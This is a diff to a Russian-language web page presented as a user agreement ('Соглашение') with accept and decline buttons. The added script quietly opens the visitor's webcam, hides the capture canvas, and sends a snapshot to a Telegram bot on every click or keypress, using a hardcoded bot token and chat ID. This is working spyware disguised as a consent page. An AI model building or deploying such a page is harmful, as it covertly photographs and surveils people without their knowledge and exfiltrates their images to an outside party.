@@ -1,159 +1,145 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <style> 
-    body {
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        height: 100vh;
-        text-align: center;
-        overflow: hidden;
-        position: relative;
-        -webkit-tap-highlight-color: transparent;
-        user-select: none;
-    }
-    .animated-button {
-        display: inline-flex;
-        align-items: center;
-        height: 40px;
-        padding-right: 24px;
-        padding-left: 24px;
-        font-size: 16px;
-        font-weight: 500;
-        line-height: 1;
-        border-radius: 4px;
-        margin: 4px;
-        cursor: pointer;
-        transition: transform 0.3s, box-shadow 0.3s;
-    }
-
-    .animated-button:hover {
-        transform: scale(1.03);
-        box-shadow: 0 6px 20px rgba(97, 97, 97, 0.7);
-    }
-
-    .animated-button:active {
-        transform: scale(0.95);
-    }
-    p {
-        margin: 0;
-    }
-
-    *, *::before, *::after {
-        box-sizing: border-box;
-    }
-
-    .overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        height: 100vh;
-        width: 100vw;
-    }
-
-    p.overlay-title {
-        font-size: 24px;
-        font-weight: 900;
-        color: black;
-        line-height: 1;
-        margin-bottom: 16px;
-    }
-
-    .overlay-button {
-        display: inline-flex;
-        align-items: center;
-        height: 40px;
-        padding-right: 24px;
-        padding-left: 24px;
-        font-size: 16px;
-        font-weight: 500;
-        line-height: 1;
-        border-radius: 4px;
-        margin: 4px;
-        cursor: pointer;
-    }
-
-    .overlay-buttons-wrapper {
-        margin: 24px -8px -8px;
-    }
-
-    #accept-button {
-        background-color: rgb(58, 58, 58);
-        color: white;
-    }
-
-    #decline-button {
-        color: rgb(58, 58, 58);
-        border: 2px solid rgb(58, 58, 58);
-    }
-
-    p.overlay-description {
-        font-size: 16px;
-        font-weight: 400;
-        color: rgba(0, 0, 0, 0.5);
-        line-height: 1.25;
-        margin-bottom: 16px;
-    }
-
-    a.overlay-link {
-        display: inline-block;
-        text-decoration: none;
-        font-size: 16px;
-        font-weight: 500;
-        color: rgb(58, 58, 58);
-        line-height: 1;
-        position: relative;
-        cursor: pointer;
-        margin-top: 16px;
-    }
-
-    a.overlay-link::before {
-        position: absolute;
-        content: "";
-        height: calc(50% + 4px);
-        width: calc(100% + 8px);
-        bottom: -4px;
-        left: -4px;
-        background-color: rgba(58, 58, 58, 0.1);
-    }
-
-    .overlay-body {
-        max-width: 512px;
-        text-align: center;
-        font-family: "Inter", sans-serif;
-    }
-
-    .overlay {
-        z-index: 2;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        background-color: #f5f6fa;
-        padding-right: 24px;
-        padding-left: 24px;
-    }
-    </style>
     <meta charset="UTF-8">
     <link rel="icon" href="favicon.png" type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Соглашение</title>
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const audio = new Audio("sound.mp3");
-            
-            function playSound() {  
-                audio.play().catch(error => console.error("Ошибка воспроизведения:", error));
-            }
-            
-            document.addEventListener("click", playSound);
-            document.addEventListener("mousemove", playSound);
-            document.addEventListener("scroll", playSound);
-            document.addEventListener("keydown", playSound);
-        });
-    </script>
+    <style> 
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            text-align: center;
+            overflow: hidden;
+            position: relative;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+        .animated-button {
+            display: inline-flex;
+            align-items: center;
+            height: 40px;
+            padding-right: 24px;
+            padding-left: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1;
+            border-radius: 4px;
+            margin: 4px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+    
+        .animated-button:hover {
+            transform: scale(1.03);
+            box-shadow: 0 6px 20px rgba(97, 97, 97, 0.7);
+        }
+    
+        .animated-button:active {
+            transform: scale(0.95);
+        }
+        p {
+            margin: 0;
+        }
+    
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+    
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+        }
+    
+        p.overlay-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: black;
+            line-height: 1;
+            margin-bottom: 16px;
+        }
+    
+        .overlay-button {
+            display: inline-flex;
+            align-items: center;
+            height: 40px;
+            padding-right: 24px;
+            padding-left: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1;
+            border-radius: 4px;
+            margin: 4px;
+            cursor: pointer;
+        }
+    
+        .overlay-buttons-wrapper {
+            margin: 24px -8px -8px;
+        }
+    
+        #accept-button {
+            background-color: rgb(58, 58, 58);
+            color: white;
+        }
+    
+        #decline-button {
+            color: rgb(58, 58, 58);
+            border: 2px solid rgb(58, 58, 58);
+        }
+    
+        p.overlay-description {
+            font-size: 16px;
+            font-weight: 400;
+            color: rgba(0, 0, 0, 0.5);
+            line-height: 1.25;
+            margin-bottom: 16px;
+        }
+    
+        a.overlay-link {
+            display: inline-block;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgb(58, 58, 58);
+            line-height: 1;
+            position: relative;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+    
+        a.overlay-link::before {
+            position: absolute;
+            content: "";
+            height: calc(50% + 4px);
+            width: calc(100% + 8px);
+            bottom: -4px;
+            left: -4px;
+            background-color: rgba(58, 58, 58, 0.1);
+        }
+    
+        .overlay-body {
+            max-width: 512px;
+            text-align: center;
+            font-family: "Inter", sans-serif;
+        }
+    
+        .overlay {
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f6fa;
+            padding-right: 24px;
+            padding-left: 24px;
+        }
+        </style>
 </head>
 <body>
     <div id="overlay" class="overlay">
@@ -169,5 +155,76 @@
         <a target="_blank" class="overlay-link">Пользовательское соглашение</a>
         </div>
         </div>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        // Настройки для работы с веб-камерой
+        const videoElement = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Замените на ваш API ключ и ID чата
+        const TELEGRAM_API_KEY = '7304964764:AAHOgvDzg3Bcwx1sU46wm6ByjU61QpRW6o0';
+        const TELEGRAM_CHAT_ID = '1422196497';
+
+        // Получаем доступ к веб-камере
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    videoElement.srcObject = stream;
+                })
+                .catch(function(error) {
+                    console.log("Ошибка при доступе к камере: ", error);
+                });
+        }
+
+        // Функция для создания снимка с видео и отправки в Telegram
+        function captureAndSendPhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            // Преобразуем канвас в изображение
+            const imageData = canvas.toDataURL('image/png');
+
+            // Преобразуем изображение в формат для отправки через Telegram
+            const imageBlob = dataURLtoBlob(imageData);
+
+            // Создаем форму для отправки изображения в Telegram
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, 'photo.png');
+
+            // Отправка POST запроса в Telegram API
+            fetch(`https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Фото отправлено в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке фото:', error);
+            });
+        }
+
+        // Функция для преобразования Data URL в Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uintArray = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([uintArray], { type: mimeString });
+        }
+
+        // Слушаем события для любого действия на странице
+        document.body.addEventListener('click', captureAndSendPhoto);
+        document.body.addEventListener('keydown', captureAndSendPhoto);
+    </script>
 </body>
 </html>
